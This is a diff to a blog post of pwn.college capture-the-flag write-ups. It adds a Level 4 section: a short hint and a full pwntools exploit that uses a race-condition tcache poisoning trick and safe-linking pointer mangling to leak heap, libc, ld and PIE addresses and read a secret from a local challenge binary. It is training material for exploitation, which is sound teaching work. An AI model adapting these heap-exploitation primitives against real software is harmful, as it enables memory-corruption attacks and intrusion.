@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Software Exploitation (Exploitation Primitives) series"
 published: 2025-11-21
-updated: 2025-11-25
+updated: 2025-11-27
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.wizenf9io.avif"
 tags: ["Pwn", "Write-ups", "FSOP"]
@@ -627,6 +627,227 @@ def main():
 
     raw_input("DEBUG")
     secret = arbitrary_read(2, 4, mangle(pos, secret))
+
+    send_flag(0, secret)
+    quit(0)
+    quit(1)
+
+    thread[0].interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Level 4
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Create and use arbitrary read primitives to read from the .bss, now with PIE.
+
+## Write-up
+
+注意权限问题，尽情侦查虚拟内存地址吧～
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    os,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", action="store_true")
+parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
+args = parser.parse_args()
+
+
+FILE = "/challenge/babyprime_level4.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def printf(tid, idx):
+    thread[tid].sendline(f"printf {idx}".encode())
+
+
+def malloc(tid, idx):
+    thread[tid].sendline(f"malloc {idx}".encode())
+
+
+def scanf(tid, idx, content):
+    thread[tid].sendline(f"scanf {idx} {content}".encode())
+
+
+def free(tid, idx):
+    thread[tid].sendline(f"free {idx}".encode())
+
+
+def send_flag(tid, secret):
+    thread[tid].sendline(b"send_flag")
+    thread[tid].sendlineafter(b"Secret: ", secret)
+
+
+def quit(tid):
+    thread[tid].sendline(b"quit")
+
+
+def arbitrary_read(poison_idx, result_idx, addr):
+    BAD_BYTES = {b"\x20", b"\x0c", b"\x0a", b"\x0d", b"\x09", b"\x0b"}
+
+    packed_addr = flat(addr)
+    if any(bytes([byte]) in BAD_BYTES for byte in packed_addr):
+        raise ValueError(
+            f"Address {hex(addr)} contains a bad byte for scanf: {packed_addr.hex()}"
+        )
+
+    while True:
+        thread[0].send((f"malloc {poison_idx} free {poison_idx}\n".encode()) * 10000)
+        if os.fork() == 0:
+            thread[1].send(
+                (f"scanf {poison_idx}".encode() + flat(addr) + b"\n") * 10000
+            )
+            os.kill(os.getpid(), 9)
+        os.wait()
+
+        malloc(0, poison_idx)
+        printf(0, poison_idx)
+        thread[0].recvuntil(b"MESSAGE: ")
+        poisoned = int.from_bytes(thread[0].recvline().strip(), "little")
+
+        # thread[0].success(f"{hex(poisoned)}, {hex(addr)}")
+        # raw_input("COMPARE")
+        if flat(poisoned) == packed_addr:
+            break
+
+    raw_input("DEBUG")
+    malloc(0, result_idx)
+    printf(0, result_idx)
+
+    thread[0].recvuntil(b"MESSAGE: ")
+    return thread[0].recvline().strip()
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target, thread
+
+    if args.L and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.L:
+        target = process(FILE)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(0, 1)
+    free(0, 1)
+    free(0, 0)
+    malloc(0, 0)
+    malloc(0, 1)
+
+    printf(0, 0)
+    thread[0].recvuntil(b"MESSAGE: ")
+    heap = int.from_bytes(thread[0].recvline().strip(), "little")
+
+    printf(0, 1)
+    thread[0].recvuntil(b"MESSAGE: ")
+    pos = int.from_bytes(thread[0].recvline().strip(), "little")
+    heap = demangle(heap, pos)
+    main_arena_ptr = heap - 0xAA1
+
+    thread[0].success(f"pos: {hex(pos)}")
+    thread[0].success(f"heap: {hex(heap)}")
+    thread[0].success(f"main_arena_ptr: {hex(main_arena_ptr)}")
+
+    raw_input("DEBUG")
+    malloc(0, 0)
+    malloc(0, 1)
+    free(0, 1)
+    free(0, 0)
+
+    libc.address = (
+        int.from_bytes(arbitrary_read(0, 1, mangle(pos - 1, main_arena_ptr)), "little")
+        - 0x219c80
+    )
+    ld_ptr = libc.address + 0x219010
+
+    thread[0].success(f"libc: {hex(libc.address)}")
+    thread[0].success(f"ld_ptr: {hex(ld_ptr)}")
+
+    raw_input("DEBUG")
+    malloc(0, 2)
+    malloc(0, 4)
+    free(0, 4)
+    free(0, 2)
+
+    ld = int.from_bytes(arbitrary_read(2, 4, mangle(pos, ld_ptr)), "little")-0x15c60
+    pie_ptr = ld + 0x3b2f0
+
+    thread[0].success(f"ld: {hex(ld)}")
+    thread[0].success(f"pie_ptr: {hex(pie_ptr)}")
+
+    raw_input("DEBUG")
+    malloc(0, 3)
+    malloc(0, 5)
+    free(0, 5)
+    free(0, 3)
+
+    elf.address = (
+        int.from_bytes(arbitrary_read(3, 5, mangle(pos, pie_ptr)), "little")-0x4ca8
+    )
+    secret_ptr = elf.address + 0x53C0
+
+    thread[0].success(f"pie: {hex(elf.address)}")
+    thread[0].success(f"secret: {hex(secret_ptr)}")
+
+    raw_input("DEBUG")
+    malloc(0, 6)
+    malloc(0, 7)
+    free(0, 7)
+    free(0, 6)
+
+    secret = arbitrary_read(6, 7, mangle(pos, secret_ptr + 0x3))
 
     send_flag(0, secret)
     quit(0)
